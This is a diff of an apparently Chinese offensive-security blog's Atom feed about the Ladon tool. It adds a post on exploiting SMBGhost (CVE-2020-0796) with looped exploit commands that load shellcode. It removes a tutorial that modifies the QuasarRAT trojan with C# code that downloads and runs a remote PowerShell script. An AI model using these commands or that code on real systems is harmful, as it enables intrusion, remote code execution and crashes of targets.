@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://k8gege.org/"/>
-  <updated>2021-05-30T08:13:42.163Z</updated>
+  <updated>2021-06-06T11:16:22.012Z</updated>
   <id>http://k8gege.org/</id>
   
   <author>
@@ -15,6 +15,42 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Ladon8.5永恒之黑漏洞利用SMBGhost CVE-2020-0796</title>
+    <link href="http://k8gege.org/p/smbghost_cve_2020_0796.html"/>
+    <id>http://k8gege.org/p/smbghost_cve_2020_0796.html</id>
+    <published>2021-06-06T11:00:00.000Z</published>
+    <updated>2021-06-06T11:16:22.012Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>2020年3月10日，微软在其官方SRC发布了CVE-2020-0796的安全公告（ADV200005，MicrosoftGuidance for Disabling SMBv3 Compression）,公告表示在Windows SMBv3版本的客户端和服务端存在远程代码执行漏洞。同时指出该漏洞存在于MicroSoft Server Message Block 3.1.1协议处理特定请求包的功能中，攻击者利用该漏洞可在目标SMB Server或者Client中执行任意代码。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>CVE-2020-0796漏洞影响运行Windows 10版本1903，Windows Server版本1903（服务器核心安装），Windows 10版本1909和Windows Server版本1909（服务器核心安装）的设备。根据Fortinet，其他Microsoft版本应受到影响。</p><h3 id="模块说明"><a href="#模块说明" class="headerlink" title="模块说明"></a>模块说明</h3><p>漏洞编号：CVE-2020-0796<br>漏洞别名：SMBGhost、永恒之黑<br>影响版本：Win10或2016 1903 | 1909<br>返回结果：IP、机器名、漏洞编号、操作系统版本</p><h3 id="无损扫描"><a href="#无损扫描" class="headerlink" title="无损扫描"></a>无损扫描</h3><p>通过检测SMB3.1.1是否启用压缩功能判定漏洞，和MS17010一样不会对目标造成任何损害，也不会被杀软拦截。</p><h3 id="SMBGhost漏洞检测"><a href="#SMBGhost漏洞检测" class="headerlink" title="SMBGhost漏洞检测"></a>SMBGhost漏洞检测</h3><h4 id="扫描指定主机SMBGhost漏洞"><a href="#扫描指定主机SMBGhost漏洞" class="headerlink" title="扫描指定主机SMBGhost漏洞"></a>扫描指定主机SMBGhost漏洞</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8 SMBGhost</span><br></pre></td></tr></table></figure><h4 id="扫描C段主机SMBGhost漏洞"><a href="#扫描C段主机SMBGhost漏洞" class="headerlink" title="扫描C段主机SMBGhost漏洞"></a>扫描C段主机SMBGhost漏洞</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/24 SMBGhost</span><br><span class="line">Ladon 192.168.1.8/C SMBGhost</span><br></pre></td></tr></table></figure><h4 id="批量扫描IP列表主机SMBGhost漏洞"><a href="#批量扫描IP列表主机SMBGhost漏洞" class="headerlink" title="批量扫描IP列表主机SMBGhost漏洞"></a>批量扫描IP列表主机SMBGhost漏洞</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip.txt SMBGhost</span><br></pre></td></tr></table></figure><h4 id="批量检测IP段（-24）SMBGhost漏洞"><a href="#批量检测IP段（-24）SMBGhost漏洞" class="headerlink" title="批量检测IP段（/24）SMBGhost漏洞"></a>批量检测IP段（/24）SMBGhost漏洞</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip24.txt SMBGhost</span><br></pre></td></tr></table></figure><h4 id="批量检测IP段（-16）SMBGhost漏洞"><a href="#批量检测IP段（-16）SMBGhost漏洞" class="headerlink" title="批量检测IP段（/16）SMBGhost漏洞"></a>批量检测IP段（/16）SMBGhost漏洞</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip16.txt SMBGhost</span><br></pre></td></tr></table></figure><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/SmbGhost.PNG"></p><h3 id="Ladon稳定利用"><a href="#Ladon稳定利用" class="headerlink" title="Ladon稳定利用"></a>Ladon稳定利用</h3><p>由于该漏洞利用不稳定，成功运气从1次到100次不等，所以8.5新增ForExec循环执行漏洞利用功能，原版EXP需交互执行，批量在本地执行还好，但要在目标，比如只有shell的情况下执行就很麻烦了，所以我们需对EXP进行一个小修改，把交互式去掉，再使用Ladon调用，一直循环有可能会导致目标蓝屏，所以我们需要判定成功后不再执行以免目标蓝屏，EXP命令循环使用Ladon ForExec查看用法。</p><p>如图：ForExec循环利用Win10永恒之黑漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon ForExec <span class="string">"CVE-2020-0796-Exp -i 192.168.1.8 -p 445 -e --load-shellcode test.txt"</span> 80 <span class="string">"Exploit finnished"</span></span><br></pre></td></tr></table></figure><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/smbghost.gif"></p><h3 id="POC-EXP-LPE"><a href="#POC-EXP-LPE" class="headerlink" title="POC/EXP/LPE"></a>POC/EXP/LPE</h3><p><a href="https://github.com/danigargu/CVE-2020-0796" target="_blank" rel="noopener">https://github.com/danigargu/CVE-2020-0796</a><br><a href="https://github.com/chompie1337/SMBGhost_RCE_PoC" target="_blank" rel="noopener">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p><h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>8.5版本：K8小密圈</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h3&gt;&lt;p&gt;2020年3月10日，微软在其官方SRC发布了CVE-2020-0796的安全公告（ADV200005，MicrosoftG
+      
+    
+    </summary>
+    
+    
+      <category term="提权" scheme="http://k8gege.org/categories/Lpe/"/>
+    
+      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+      <category term="远程执行" scheme="http://k8gege.org/categories/Rce/"/>
+    
+    
+      <category term="LPE" scheme="http://k8gege.org/tags/LPE/"/>
+    
+      <category term="RCE" scheme="http://k8gege.org/tags/RCE/"/>
+    
+      <category term="CVE-2020-0796" scheme="http://k8gege.org/tags/CVE-2020-0796/"/>
+    
+      <category term="SMBGhost" scheme="http://k8gege.org/tags/SMBGhost/"/>
+    
+  </entry>
   
   <entry>
     <title>〖工具〗Ladon 8.4 &amp; Cobalt Strike插件发布</title>
@@ -544,34 +580,6 @@ Visit &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;
       <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
     
       <category term="lpe" scheme="http://k8gege.org/tags/lpe/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>〖教程〗QuasarRat代码修改加载Ladon一键扫描内网</title>
-    <link href="http://k8gege.org/p/quasar.html"/>
-    <id>http://k8gege.org/p/quasar.html</id>
-    <published>2021-01-08T16:10:00.000Z</published>
-    <updated>2021-01-17T08:38:01.011Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>修改Quasar加载Ladon一键扫描内网,在CmdShell上使用Ladon命令对内网进行存活主机探测、操作系统识别、端口扫描、服务识别、MS17010高危漏洞检测、SSH\SMB\WMI\IPC\MYSQL\ORACLE\SQL\FTP\NBT网络协议密码爆破，以及内网横向移动wmiexec、psexec、smbexec、sshexec等</p><h3 id="QuasarRat"><a href="#QuasarRat" class="headerlink" title="QuasarRat"></a>QuasarRat</h3><p>Quasar是一种公开可用的开源远程访问木马（RAT），主要针对Windows操作系统。Quasar通过恶意附件在网络钓鱼电子邮件中分发。<br>Quasar最初是由GitHub用户 MaxXor 开发，用于合法用途。然而，该工具此后被黑客用于各种网络间谍活动。Quasar于2014年7月首次发布，名为“xRAT 2.0”，后来于2015年8月更名为“Quasar”。<a href="https://github.com/quasar/QuasarRAT" target="_blank" rel="noopener">https://github.com/quasar/QuasarRAT</a></p><h3 id="去启动框"><a href="#去启动框" class="headerlink" title="去启动框"></a>去启动框</h3><p>主窗体，注释以下代码,启动客户端就不会再弹启动框了</p><pre><code>private void ShowTermsOfService(){    //using (var frm = new FrmTermsOfUse())    //{    //    frm.ShowDialog();    //}    //Thread.Sleep(300);}</code></pre><h3 id="联动Ladon"><a href="#联动Ladon" class="headerlink" title="联动Ladon"></a>联动Ladon</h3><p>SystemHandler.cs第484行，加上以下代码，Url改成自己的PowerLadon,编译即可。当然这段代码放在客户端的下发指令这里也可以。</p><pre><code>else if (input.Substring(0, 5) == &quot;Ladon&quot;){    string LadonUrl = &quot;http://192.168.1.110:800/Ladon.ps1&quot;;    string LadonCmd = &quot;powershell -nop -c \&quot;IEX (New-Object Net.WebClient).DownloadString(&apos;&quot; + LadonUrl + &quot;&apos;); &quot; + input + &quot;\&quot;&quot;;    _shell.ExecuteCommand(LadonCmd);}</code></pre><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/qscmd.PNG"></p><p>PS：任何shell、C2、RAT、后门不管你怎么称呼，但凡能执行命令的地方，都可用此方法加载Ladon强化自己的工具</p><h3 id="执行效果"><a href="#执行效果" class="headerlink" title="执行效果"></a>执行效果</h3><p>机器上线后，在CmdShell上使用Ladon命令对内网进行存活主机探测、操作系统识别、端口扫描、服务识别、MS17010高危漏洞检测、SSH\SMB\WMI\IPC\MYSQL\ORACLE\SQL\FTP\NBT网络协议密码爆破，以及内网横向移动wmiexec、psexec、smbexec、sshexec等,更多功能请看Ladon文档。下图为探测C段存活主机，探测B段可使用ip/b参数，当然探测C段也可使用ip/c参数，不是非要/24.<br><img alt data-original="http://k8gege.org/k8img/Ladon/exe/QSLadon.PNG"></p><h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>7.8版本：K8小密圈</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;修改Quasar加载Ladon一键扫描内网,在CmdShell上使用Ladon命令对内网进行存活主机探测、操作系统识别、端口扫描、服务识别、
-      
-    
-    </summary>
-    
-    
-      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
-    
-    
-      <category term="quasar" scheme="http://k8gege.org/tags/quasar/"/>
-    
-      <category term="rat" scheme="http://k8gege.org/tags/rat/"/>
     
   </entry>
   
